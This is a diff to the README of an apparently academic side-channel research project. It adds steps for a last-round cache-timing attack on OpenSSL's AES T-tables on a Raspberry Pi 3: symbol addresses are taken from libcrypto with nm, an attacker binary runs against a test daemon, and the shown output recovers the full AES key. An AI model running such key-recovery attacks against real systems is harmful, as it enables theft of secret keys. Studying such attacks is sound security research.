@@ -3,10 +3,17 @@
 side-channel-attack
 
 # Contents
-1. [How to build - armv7](#1-How-to-build-armv7)
-2. [How to build - armv8](#1-How-to-build-armv8)
-3. [How to install to your device](#3-How-to-install-to-your-device)
-4. [How to run one-round-attack - rpi3 (armv8)](#4-How-to-run-one-round-attack-rpi3-armv8)
+1. [How to build - armv7](#1-how-to-build---armv7)
+2. [How to build - armv8](#2-how-to-build---armv8)
+3. [How to install to your device](#3-how-to-install-to-your-device)
+4. [How to run one-round-attack - rpi3 (armv8)](#4-how-to-run-one-round-attack---rpi3-armv8)
+5. [How to run last-round-attack - rpi3 (armv8)](#5-how-to-run-last-round-attack---rpi3-armv8)
+6. [Supported attack for each arch](#6-supported-attack-for-each-arch)
+
+# License
+
+* © 2017 Jinbum Park
+* jinb.park@samsung.com
 
 # 1. How to build - armv7
 
@@ -74,10 +81,43 @@ side-channel-attack
 	  [1]+  Done                       ./security_daemon
 	```
 
-# 5. Supported attack for each arch
+# 5. How to run last-round-attack - rpi3 (armv8)
+
+* Get T-table, rcon address from openssl library (on your host)
+	```
+	$ nm libcrypto.so.1.0.0 | grep Te0
+	  0000000000170090 r Te0
+	==> repeat for Te1, Te2, Te3, rcon
+	```
+
+* Run last-round-attack on rpi3
+	```
+	$ ./security_daemon &
+	  root@RPi3:/aes security_daemon is running...
+	  real key : a2981898c47187538cde1709dbd9ab40
+	$ ./attacker
+	  USAGE : ./attacker <limit plain text count> <cpu cycle threshold> <offset te0> <offset te1> <offset te2> <offset te3> <offset rcon>
+	  EXAMPLE : ./attacker 1000 200 0010c0b8 0010c4b8 0010c4c8 0010c4d8 0010c4e8
+	$ ./attacker 500 200 00170090 0016fc90 00170890 00170490 00170c90
+	  progress : 0 / 500
+	  progress : 20 / 500
+	  ......
+	  ......
+	  progress : 480 / 500
+	  predict last round key : 9886c881cad8676e0f01eb4a30df89f5  ==> finish to get last round key
+	  invert round key!!  ==> try to invert from last round key to real key (0 round key)
+	  first key : a2981898c47187538cde1709dbd9ab40
+	  predict key : a2981898c47187538cde1709dbd9ab40
+	  ......
+	  real key : a2981898c47187538cde1709dbd9ab40
+	  predict key : a2981898c47187538cde1709dbd9ab40
+	  Recover [16] byte success!! ==> It's result of attack!!
+	```
+
+# 6. Supported attack for each arch
 
 * one-round-attack is enable on both armv7 and armv8.
-* last-round-attack is enable on armv7. (to do on armv8)
+* last-round-attack is enable on both armv7 and armv8.
 
 
 
